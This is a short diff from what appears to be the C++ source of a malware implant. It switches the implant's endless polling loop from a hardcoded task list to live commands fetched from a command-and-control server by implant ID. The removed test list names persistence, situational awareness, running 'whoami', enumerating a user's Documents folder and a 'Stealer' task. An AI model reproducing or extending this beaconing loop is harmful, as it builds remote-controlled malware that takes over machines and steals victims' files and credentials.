@@ -65,8 +65,8 @@ Expected Check in: When should you expect to see the agent again?
 void IWillRunForever(void){
     while(true){
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
-		std::string new_item = "[[0,0,\"Persistance_1\"],[0,0,\"SituationalAwareness\"],[0,0,\"Execution whoami\"],[0,0,\"File_Enumeration C:/users/mochi/Documents/University\"],[0,0,\"Stealer\"]]";
-        //std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
+		
+		std::string new_item = HttpGetCommand("/get_commands", IMPLANT_ID);
         json converted_new_item = json::parse(new_item);
         int num_of_tasks = converted_new_item.size();
         for(int i = 0; i < num_of_tasks; i++){
